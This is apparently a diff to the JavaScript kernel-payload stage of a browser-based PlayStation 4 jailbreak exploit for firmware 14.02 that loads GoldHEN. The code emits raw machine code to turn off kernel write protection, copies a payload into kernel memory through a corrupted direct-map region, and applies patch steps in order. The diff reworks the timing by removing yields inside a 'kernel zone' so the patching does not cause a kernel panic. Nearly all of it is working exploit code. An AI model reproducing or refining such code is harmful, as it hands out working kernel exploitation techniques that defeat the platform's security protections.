@@ -1247,17 +1247,19 @@ async function loadKpayloadSteps(k, kbase, room) {
   const saySync = function (m) { try { const x = new XMLHttpRequest(); x.open("GET", "ag_log?m=" + encodeURIComponent(m), false); x.send(); } catch (e) {} };
 
   say("[kp] kernel base " + text(kbase) + ", padding " + text(t));
+  say("[kp] entering kernel ops -- no yield until all " + KP_STEPS.length + " patches land");
   await breathe();
+  // ---- KERNEL ZONE: no yields past this point until all steps finish ----
+  // yielding to the event loop while the kernel is partially patched lets
+  // the browser make syscalls into half-modified code paths -> kernel panic.
   // patchset.bin skipped for FW 14.02: its hardcoded offsets are FW 14.00 only
   // and writing JMP [RSI] (FF 26) to the wrong kernel address causes a kernel panic.
   // GoldHEN's own KP_STEPS (patch groups 1-6) apply all required kernel patches
   // themselves with the correct offsets derived from the shiftfit at stage [7b].
   const dmapPad = paddingRW(k, kbase);
   if (!dmapPad) { say("[kp] stopping: padding setup failed"); return false; }
-  await breathe();
 
   say("[kp] rep movsb -> dmap " + text(dmapPad));
-  await breathe();
   tram.n = 0;
   wpOff();
   hex("48be"); q64(data);
@@ -1269,17 +1271,12 @@ async function loadKpayloadSteps(k, kbase, room) {
   hex("0f0138");              // invlpg [rax] -- flush stale TLB entry after paddingRW
   hex("b8"); i32(0x5758); hex("c3");
   const cp = fire();
-  await breathe();
   if (cp !== 0x5758) { say("[kp] copy returned 0x" + cp.toString(16)); return false; }
   say("[kp] " + blob.length + " bytes into the padding");
-  await breathe();
 
   let silent = 0;
   for (let n = 0; n < KP_STEPS.length; n++) {
-    await breathe();
     const rva = KP_STEPS[n][0], what = KP_STEPS[n][1];
-    say("[kp] [" + (n + 1) + "/" + KP_STEPS.length + "] " + what);
-    await breathe();
     try {
       markClear();
       tram.n = 0;
@@ -1295,7 +1292,6 @@ async function loadKpayloadSteps(k, kbase, room) {
       hex("48b9"); q64(stepStack); hex("488b21");
       wpOn(); hex("31c0"); hex("c3");
       fire();
-      await breathe();
       const mk = markRead();
       if (mk[1] === 0xDEADBEEF) {
         say("[kp] [" + (n + 1) + "] did NOT return -- " + what);
@@ -1304,7 +1300,7 @@ async function loadKpayloadSteps(k, kbase, room) {
       }
       let rc = mk[0];
       if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
-      say("[kp] [" + (n + 1) + "] rc=" + rc + " -- " + what);
+      say("[kp] [" + (n + 1) + "/" + KP_STEPS.length + "] rc=" + rc + " -- " + what);
       if (n === 0 && rc !== 0) {
         say("[kp] init failed -- stopping");
         return false;
@@ -1315,7 +1311,9 @@ async function loadKpayloadSteps(k, kbase, room) {
       break;
     }
   }
+  // ---- END KERNEL ZONE ----
   say("[kp] kpayload chain done, " + silent + " silent");
+  await breathe();
   return silent === 0;
 }/* ------------------------------------------------------- GoldHEN */
 
